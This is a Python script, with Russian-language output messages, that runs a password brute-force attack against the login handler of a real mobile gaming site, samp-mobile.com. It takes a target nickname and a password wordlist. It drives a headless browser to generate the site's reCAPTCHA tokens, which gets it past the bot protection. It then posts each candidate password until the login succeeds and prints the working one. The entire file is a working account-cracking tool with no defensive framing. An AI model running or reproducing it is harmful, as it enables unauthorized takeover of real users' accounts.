# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import json
import time
from selenium import webdriver


async def main():
	session = aiohttp.ClientSession()
	driver = webdriver.PhantomJS(executable_path='resources/phantomjs.exe')
	driver.get('https://samp-mobile.com/account/')

	settings = open('settings.json')
	settings = settings.read()
	settings = json.loads(settings)

	open('status.json', 'w').write('{"time": "", "speed": "", "current-password": "", "password": ""}')

	userName = settings['nickname']
	base = open(settings['files'][0]['path'])
	base = base.read()
	base = base.split()

	startTime = time.time()

	for userPassword in base:
		driver.execute_script("grecaptcha.ready(function() {grecaptcha.execute('6LfhuPcUAAAAAPTrbOFLnwQMXDbkTrwDeZ6xodrO', {action: 'homepage'}).then(function(token) {document.getElementById('g-recaptcha-response').value=token;});});")
		g_recaptcha_response = driver.find_element_by_id('g-recaptcha-response')
		g_recaptcha_response = g_recaptcha_response.get_attribute('value')
		if g_recaptcha_response == '':
			exit()
		data = {
			"user_name" : userName,
			"user_password" : userPassword,
			"act" : "account_login",
			"g-recaptcha-response" : g_recaptcha_response
		}

		try:
			id = base.index(userPassword)
			workTime = time.time() - startTime
			workSpeed = id / workTime
		except:
			pass

		response = await session.post('https://samp-mobile.com/system/global_classes/Handler.php', data=data)
		response = await response.json()
		status = response['status']
		if status == 'ok':
			print(f'Верный пароль: {userPassword}')
			input()
			exit()
		else:
			print(f'Текущий пароль: {userPassword}')

loop = asyncio.get_event_loop()
loop.run_until_complete(main())